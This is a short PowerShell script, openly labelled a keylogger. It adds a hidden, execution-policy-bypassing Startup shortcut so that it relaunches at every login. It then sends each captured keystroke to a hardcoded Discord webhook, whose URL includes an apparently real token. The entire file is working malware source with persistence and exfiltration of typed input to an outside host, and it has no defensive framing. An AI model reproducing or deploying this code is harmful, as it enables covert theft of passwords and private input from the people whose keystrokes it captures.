# --- Configuration ---
$webhookUrl = "https://discord.com/api/webhooks/1363942155105865909/xfuFLDF6gBZ62O9ij5vh-FH4BnCqdl5lZLCYvmqvwsmH7fcHh34kqFxmhigqiWVUyBiT"
$scriptPath = $MyInvocation.MyCommand.Definition
$startupFolder = [Environment]::GetFolderPath("Startup")
$shortcutPath = Join-Path $startupFolder "k.lnk"

# --- Function to create shortcut in Startup folder ---
function Create-StartupShortcut {
    if (-not (Test-Path $shortcutPath)) {
        $shell = New-Object -ComObject WScript.Shell
        $shortcut = $shell.CreateShortcut($shortcutPath)
        $shortcut.TargetPath = "powershell.exe"
        $shortcut.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
        $shortcut.WorkingDirectory = Split-Path $scriptPath
        $shortcut.Save()
    }
}

# --- Create startup shortcut if not exists ---
Create-StartupShortcut

# --- Keylogger loop ---
Write-Host "Keylogger started. Press ESC to stop."

while ($true) {
    $key = [console]::ReadKey($true)  # true = do not display key
    if ($key.Key -eq 'Escape') { break }

    $char = $key.KeyChar
    if ($char -ne '') {
        $payload = @{ content = $char } | ConvertTo-Json
        try {
            Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json"
        } catch {
            # Ignore errors
        }
    }
}
